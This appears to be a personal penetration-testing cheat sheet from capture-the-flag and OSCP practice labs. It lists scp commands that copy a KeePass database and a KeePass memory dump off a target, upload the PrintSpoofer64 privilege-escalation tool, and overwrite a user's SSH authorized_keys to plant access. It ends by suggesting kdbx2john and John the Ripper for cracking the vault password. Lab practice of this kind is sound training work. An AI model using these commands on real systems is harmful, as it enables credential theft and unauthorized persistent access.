# Authorized File Transfer

---

## Downloading 

```
scp lnorgaard@keeper.htb:/home/lnorgaard/passcodes.kdbx .
```

## Uploading

```
scp PrintSpoofer64.exe david@target.ine.local:"C:\\Users\\david\\" --> e.G with ssh
```

```
scp -O /home/saitama/Desktop/Exploiting/OSCP_Prep/ProvingGrounds/Linux/Sorcerer/home/max/.ssh/authorized_keys max@192.168.130.100:/home/max/.ssh/authorized_keys
```

Retrieved both files

```
scp lnorgaard@keeper.htb:/home/lnorgaard/KeePassDumpFull.dmp . 
lnorgaard@keeper.htb's password: 
KeePassDumpFull.dmp                                                           100%  242MB   3.7MB/s   01:05
```

There is an tool called kdbx2john which allows us to convert the .kdbx file into hash format, with the .hash file we could potentially bruteforce an user password with john the ripper.
